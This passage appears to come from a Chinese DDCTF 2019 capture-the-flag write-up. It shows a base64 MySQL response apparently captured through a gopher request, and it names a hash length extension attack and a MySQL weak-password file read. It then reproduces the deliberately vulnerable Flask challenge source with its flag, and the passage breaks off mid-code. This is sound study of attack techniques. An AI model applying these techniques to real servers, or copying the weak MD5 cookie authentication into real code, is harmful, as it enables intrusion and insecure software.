<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:404,&quot;data&quot;:[&quot;SgAAAAo1LjYuNDMAJwIAACotQkZ2RCxQAP/3CAIAf4AVAAAAAAAAAAAAAC0xTGtURkBNQ0h+YgBteXNxbF9uYXRpdmVfcGFzc3dvcmQABwAAAgAAAAIAAAABAAABAScAAAIDZGVmAAAAEUBAdmVyc2lvbl9jb21tZW50AAwhAFQAAAD9AAAfAAAFAAAD/gAAAgAdAAAEHE15U1FMIENvbW11bml0eSBTZXJ2ZXIgKEdQTCkFAAAF/gAAAgABAAABASAAAAIDZGVmAAAACkRBVEFCQVNFKCkADCEAZgAAAP0AAB8AAAUAAAP+AAACAAEAAAT7BQAABf4AAAIABwAAAQAAAAIAAAABAAABAUsAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQhTQ0hFTUFUQQhTQ0hFTUFUQQhEYXRhYmFzZQtTQ0hFTUFfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgATAAAEEmluZm9ybWF0aW9uX3NjaGVtYQYAAAUFbXlzcWwTAAAGEnBlcmZvcm1hbmNlX3NjaGVtYQkAAAcIc2VjdXJpdHkFAAAI/gAAIgABAAABAVoAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQtUQUJMRV9OQU1FUwtUQUJMRV9OQU1FUxJUYWJsZXNfaW5fc2VjdXJpdHkKVEFCTEVfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgAFAAAEBGZsYWcFAAAF/gAAIgAsAAABA2RlZghzZWN1cml0eQRmbGFnBGZsYWcCaWQCaWQMPwALAAAAAwEQAAAAATAvAAACA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAPsFAAAD/gAAAgABAAABAioAAAIDZGVmCHNlY3VyaXR5BGZsYWcEZmxhZwJpZAJpZAw/AAsAAAADARAAAAAuAAADA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAAUAAAT+AAAiACoAAAUBMSdERENURnswYjVkMDVkODBjY2ViNGI4NWM4MjQzYzAwYjYyYTdjZH0FAAAG/gAAIgA=&quot;],&quot;msg&quot;:&quot;\u670d\u52a1\u5668\u672a\u5f00\u542fmysql&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>解码<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/4.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;0b5d05d80cceb4b85c8243c00b62a7cd&#125;</span><br></pre></td></tr></table></figure>

<p><code>大吉大利，今晚吃鸡</code></p>
<blockquote>
<p>解法:哈希扩展攻击</p>
</blockquote>
<p>大吉大利今晚吃鸡这题一般做法是写脚本批量注册、买门票、获取<code>id</code>,<code>ticket</code>然后移除，但是这个做法具有不确定性，id会疯狂重复，可能会一直吃不了鸡</p>
<p>赛后通过<code>mysql弱口令扫描</code>读取文件，可以读到<code>home/dc2-user/ctf_web_1/web_1/app/main/views.py</code></p>
<p><code>views.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from: ('117.51.147.155', 52848)</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify, request,redirect</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> mongodb</span><br><span class="line"><span class="keyword">from</span> app.unitis.tools <span class="keyword">import</span> get_md5, num64_to_32</span><br><span class="line"><span class="keyword">from</span> app.main.db_tools <span class="keyword">import</span> get_balance, creat_env_db, search_bill, secrity_key, get_bill_id</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">mydb = mongodb.db</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'''DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    password = request.args.get(<span class="string">'password'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(password)&gt;=<span class="number">8</span>:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"密码必须大于等于8位"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hash_val = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mydb.get_collection(<span class="string">'account'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;):</span><br><span class="line">            mydb.get_collection(<span class="string">'account'</span>).insert_one(&#123;<span class="string">'user_name'</span>: user_name, <span class="string">'password'</span> :password, <span class="string">'balance'</span>: <span class="number">100</span>,</span><br><span class="line">                                                       <span class="string">'hash_val'</span>: hash_val, <span class="string">'flag'</span>: <span class="string">'test'</span>&#125;)</span><br><span class="line">            tmp_result = &#123;<span class="string">'user_name'</span>: user_name, <span class="string">'account'</span>: <span class="number">100</span>&#125;</span><br><span class="line">            result.append(tmp_result)</span><br><span class="line">            response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"用户注册成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">            response.set_cookie(<span class="string">'user_name'</span>, user_name)</span><br><span class="line">            response.set_cookie(<span class="string">'REVEL_SESSION'</span>, hash_val)</span><br><span class="line">            response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"用户已存在"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">            response.set_cookie(<span class="string">'user_name'</span>, user_name)</span><br><span class="line">            response.set_cookie(<span class="string">'REVEL_SESSION'</span>, hash_val)</span><br><span class="line">            response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    password = request.args.get(<span class="string">'password'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> mydb.get_collection(<span class="string">'account'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;):</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"该用户未注册"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password == mydb.get_collection(<span class="string">'account'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)[<span class="string">'password'</span>]:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"密码错误"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hash_val = mydb.get_collection(<span class="string">'account'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)[<span class="string">'hash_val'</span>]</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"登陆成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.set_cookie(<span class="string">'user_name'</span>, user_name)</span><br><span class="line">        response.set_cookie(<span class="string">'REVEL_SESSION'</span>, hash_val)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_balance</span><span class="params">()</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"您未登陆"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">        <span class="keyword">if</span> hash_val == str_md5:</span><br><span class="line">            balance = get_balance(user_name)</span><br><span class="line">            bill_id  = get_bill_id(user_name)</span><br><span class="line">            tmp_dic = &#123;<span class="string">'balance'</span>: balance , <span class="string">'bill_id'</span>: bill_id&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"查询成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_ticket</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    ticket_price = int(request.args.get(<span class="string">'ticket_price'</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val <span class="keyword">or</span> <span class="keyword">not</span> ticket_price:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ticket_price &lt; <span class="number">1000</span>:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"ticket门票价格为2000"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> search_bill(user_name):</span><br><span class="line">        tmp_list = []</span><br><span class="line">        bill_tmp = &#123;<span class="string">'bill_id'</span>: search_bill(user_name)&#125;</span><br><span class="line">        tmp_list.append(bill_tmp)</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"请支付未完成订单"</span>, <span class="string">"data"</span>: tmp_list&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 生成uuid 保存订单</span></span><br><span class="line">        hash_id = str(uuid.uuid4())</span><br><span class="line">        tmp_dic = &#123;<span class="string">'user_name'</span>: user_name, <span class="string">'ticket_price'</span>: ticket_price, <span class="string">'bill_id'</span>: hash_id&#125;</span><br><span class="line">        mydb.get_collection(<span class="string">'bill'</span>).insert_one(tmp_dic)</span><br><span class="line">        result.append(&#123;<span class="string">'user_name'</span>: user_name, <span class="string">'ticket_price'</span>: ticket_price, <span class="string">'bill_id'</span>: hash_id&#125;)</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"购买门票成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_bill_info</span><span class="params">()</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"您未登陆"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">        <span class="keyword">if</span> hash_val == str_md5:</span><br><span class="line">            tmp = mydb.get_collection(<span class="string">'bill'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> tmp:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"不存在订单"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">            bill_id = tmp[<span class="string">'bill_id'</span>]</span><br><span class="line">            user_name =user_name</span><br><span class="line">            bill_price = tmp[<span class="string">'ticket_price'</span>]</span><br><span class="line">            tmp_dic = &#123;<span class="string">'user_name'</span>: user_name, <span class="string">'bill_id'</span>: bill_id, <span class="string">'bill_price'</span>: bill_price&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"查询成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recall_bill</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    bill_id = request.args.get(<span class="string">'bill_id'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    tmp =mydb.get_collection(<span class="string">'bill'</span>).find_one(&#123;<span class="string">'bill_id'</span>: bill_id&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"订单号不存在"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="string">'user_name'</span>] != user_name:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"订单号不存在"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mydb.get_collection(<span class="string">'bill'</span>).delete_one(&#123;<span class="string">'bill_id'</span>: bill_id&#125;)</span><br><span class="line">        tmp_result = &#123;<span class="string">'user_name'</span>: tmp[<span class="string">'user_name'</span>], <span class="string">'bill_id'</span>: tmp[<span class="string">'bill_id'</span>], <span class="string">'ticket_price'</span>: tmp[<span class="string">'ticket_price'</span>]&#125;</span><br><span class="line">        result.append(tmp_result)</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"订单已取消"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pay_ticket</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    bill_id = request.args.get(<span class="string">'bill_id'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val <span class="keyword">or</span> <span class="keyword">not</span> bill_id:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">        response.headers[<span 